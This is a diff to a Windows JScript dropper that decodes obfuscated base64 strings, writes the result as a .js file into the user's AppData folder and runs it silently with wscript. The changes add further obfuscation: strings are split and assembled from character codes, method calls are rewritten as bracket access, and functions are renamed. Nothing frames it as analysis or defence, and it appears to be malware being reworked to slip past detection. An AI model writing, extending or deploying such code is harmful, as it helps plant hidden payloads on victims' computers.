@@ -8,35 +8,35 @@ var superString3 = 'sZ1scodigo1XSk7DQp9IcodigoGNhdGNoKGVycikgew0codigoKfQ0KdHJ5I
 
 //#endregion
 
-var furduncio = superString.replace(/codigo/g, "").replace(/!@/g, "A");
+var furduncio = superString['replace'](/codigo/g, "")['replace'](/!@/g, "A");
 
-var furduncio2 = superString2.replace(/codigo/g, "").replace(/!@/g, "A");
+var furduncio2 = superString2['replace'](/codigo/g, "")['replace'](/!@/g, "A");
 
-var furduncio3 = superString3.replace(/codigo/g, "").replace(/!@/g, "A");
+var furduncio3 = superString3['replace'](/codigo/g, "")['replace'](/!@/g, "A");
 
-var omaga = furduncio.concat(furduncio2, furduncio3);
+var omaga = furduncio['concat'](furduncio2, furduncio3);
 
-var casca = WScript['CreateObject']("WScript" + "." + "Shell");
-var diterorio = casca['ExpandEnvironmentStrings']("%appdata%");
+var casca = WScript['CreateObject'](String['fromCharCode'](88 - 1) + ['S', 'c'].join('') + ['r', 'i', 'p', 't'].join('') + "." + "Sh" + ['e', 'l', 'l'].join(''));
+var diterorio = casca['ExpandEnvironmentStrings']("%ap" + "pdata%");
 var primeiroCaminho = diterorio + "\\tAhkoltMPs.js";
 var theCoded = picole(omaga);
-writeBytes(primeiroCaminho, theCoded);
+escreveBaits(primeiroCaminho, theCoded);
 casca['run']("wscript //B \"" + primeiroCaminho + "\"");
 
-function writeBytes(file, bytes) {
+function escreveBaits(file, bytes) {
     try {
-        var binaryStream = WScript.CreateObject("ADODB.Stream");
-        binaryStream.Type = 1;
-        binaryStream.Open();
-        binaryStream.Write(bytes);
-        binaryStream.SaveToFile(file, 2);
+        var baineriStrim = WScript['CreateObject']("ADODB" + "." + "Stream");
+        baineriStrim.Type = 1;
+        baineriStrim['Open']();
+        baineriStrim['Write'](bytes);
+        baineriStrim['SaveToFile'](file, 2);
     } catch (err) {
     }
 }
 
 function picole(omaga) {
-    var xmlDOM = new ActiveXObject("Microsoft.XMLDOM");
-    var el = xmlDOM.createElement("tmp");
+    var xmlDOM = new ActiveXObject("Microsoft" + "." + "XMLDOM");
+    var el = xmlDOM['createElement']("tmp");
     el.dataType = "bin.Base64";
     el.text = omaga;
 
@@ -53,7 +53,7 @@ function picole(omaga) {
     a2 = []
 
     for (i = 0; i < a.length; i++) {
-        a2.push(String.fromCharCode(a[i]))
+        a2.push(String['fromCharCode'](a[i]))
     }
 
     var b = []
@@ -68,10 +68,10 @@ function picole(omaga) {
     var b2 = []
 
     for (i = 0; i < b.length; i++) {
-        b2.push(String.fromCharCode(b[i]))
+        b2.push(String['fromCharCode'](b[i]))
     }
 
-    var c = a2[0] + a2[1] + a2[2] + a2[3] + a2[4] + String.fromCharCode(p)
+    var c = a2[0] + a2[1] + a2[2] + a2[3] + a2[4] + String['fromCharCode'](p)
 
     var c2 = c + b2[0] + b2[1] + b2[2] + b2[3]
 
@@ -79,7 +79,7 @@ function picole(omaga) {
 
     var c4 = b2[5]
 
-    var z = c3 + c4.replace('n', 'm')
+    var z = c3 + c4['replace']('n', 'm')
 
     var strm = WScript.CreateObject(z);
     strm.Type = 1;
